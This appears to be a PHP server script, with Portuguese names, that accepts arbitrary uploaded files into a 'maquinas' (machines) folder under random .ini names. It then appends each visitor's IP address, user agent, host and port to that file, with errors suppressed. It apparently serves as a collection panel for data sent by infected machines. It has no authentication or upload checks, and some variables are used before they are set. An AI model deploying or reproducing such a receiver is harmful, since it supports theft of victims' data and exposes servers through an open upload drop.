<?php
error_reporting(0);

if(isset($_FILES['userfile']['name'])){

$characters = array(
"A","B","C","D","E","F","G","H","J","K","L","M",
"N","P","Q","R","S","T","U","V","W","X","Y","Z",
"1","2","3","4","5","6","7","8","9");

$keys = array();

while(count($keys) < 7) {

    $x = mt_rand(0, count($characters)-1);
    if(!in_array($x, $keys)) {
       $keys[] = $x;
    }
}

foreach($keys as $key){
   $random_chars .= $characters[$key];
}

$upDir = getcwd() . "/maquinas/";

$uploadfile = $upDir . $random_chars . rand() . rand(0000,9999) . md5($uploadfile) . ".ini";

$caminhox = $uploadfile;

move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile); 

}

function w($a = ''){
        if (empty($a)) return array();
        return explode(' ', $a);
}

function _browser($a_browser = false, $a_version = false, $name = false){
        $browser_list = 'msie firefox chrome konqueror safari netscape navigator opera mosaic lynx amaya omniweb avant camino flock seamonkey aol mozilla gecko';
        $user_browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        $this_version = $this_browser = '';
        
        $browser_limit = strlen($user_browser);
        foreach (w($browser_list) as $row){
                $row = ($a_browser !== false) ? $a_browser : $row;
                $n = stristr($user_browser, $row);
                if (!$n || !empty($this_browser)) continue;
                
                $this_browser = $row;
                $j = strpos($user_browser, $row) + strlen($row) + 1;
                for (; $j <= $browser_limit; $j++){
                        $s = trim(substr($user_browser, $j, 1));
                        $this_version .= $s;
                        
                        if ($s === '') break;
                }
        }
        
        if ($a_browser !== false){
                $ret = false;
                if (strtolower($a_browser) == $this_browser){
                        $ret = true;
                        if ($a_version !== false && !empty($this_version)){
                                $a_sign = explode(' ', $a_version);
                                if (version_compare($this_version, $a_sign[1], $a_sign[0]) === false){
                                        $ret = false;
                                }
                        }
                }
                return $ret;
        }
        
        $this_platform = '';
        if (strpos($user_browser, 'linux')){
                $this_platform = 'linux';
        }
        elseif (strpos($user_browser, 'macintosh') || strpos($user_browser, 'mac platform x')){
                $this_platform = 'mac';
        }
        else if (strpos($user_browser, 'windows') || strpos($user_browser, 'win32')){
                $this_platform = 'windows';
        }
        
        if ($name !== false){
                return $this_browser . ' ' . $this_version;
        }
        
        return array(
                "browser"         => $this_browser,
                "version"         => $this_version,
                "platform"       => $this_platform,
                "useragent"     => $user_browser
        );
}


$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
$data = gmdate("d-m-Y", $timestamp);
$data2 = gmdate("H-i-s", $timestamp);
$ip = $_SERVER['REMOTE_ADDR'];

$vBrowser = _browser();

$info ="
[Acesso]
Data=".gmdate("d", $timestamp)."/".gmdate("m", $timestamp)."/".gmdate("Y", $timestamp)." - ".gmdate("H", $timestamp).":".gmdate("i", $timestamp).":".gmdate("s", $timestamp)."
IP=".$ip."
UserAgent=".$vBrowser['useragent']."
HostIP=".$_SERVER["HTTP_HOST"]."
HostName=". $_SERVER["SERVER_NAME"]. "
TipoRequest=". $_SERVER["REQUEST_METHOD"]. "
TempoRequest=". $_SERVER['REQUEST_TIME'] ."
PortaRemota=". $_SERVER['REMOTE_PORT'] ."
";

$abrir_txt = fopen($caminhox, "a");
fwrite($abrir_txt, $info);
fclose($abrir_txt);

?>
